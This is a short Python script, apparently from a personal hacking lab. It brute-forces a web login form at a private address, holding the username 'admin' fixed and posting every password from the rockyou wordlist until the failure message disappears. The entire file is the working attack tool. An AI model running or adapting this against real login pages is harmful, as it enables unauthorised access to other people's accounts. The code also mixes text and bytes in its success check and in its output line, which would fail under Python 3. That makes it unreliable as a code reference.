#!/usr/bin/env python

import requests
from tqdm import tqdm

# import the target url and method
target_url = "http://10.0.0.2/login.html"
data_dict = {"username": "admin", "password": "", "Login": "button", "Try Again": ""}

# search response.content for access denied message
access_denied = "Incorrect Username or Password"

# specify the wordlist file
wordlist_file = ("E:\\DATA BACKUP\\Ethical Hacking\\Wordlists\\rockyou.txt")

# count the number of words in the wordlist
num_words = len(list(open(wordlist_file, "rb")))

# print the total number of passwords to test
print("Total passwords to test:", num_words)

# open the wordlist file and iterate through each word, stripping the words of whitespace chars
# once the password is found, it will be displayed and the program will terminate
with open(wordlist_file, "rb") as wordlist_file:
    for word in tqdm(wordlist_file, total = num_words, unit = "word"):
        word = word.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data = data_dict)
        if access_denied not in response.content:
            print("[+] Found the password --> " + word)
            exit()

# If the program gets this far, it has not found the password in the wordlist
print("[!] Reached end of line. Try another wordlist")




# TODO: Create a simple GUI for ease of use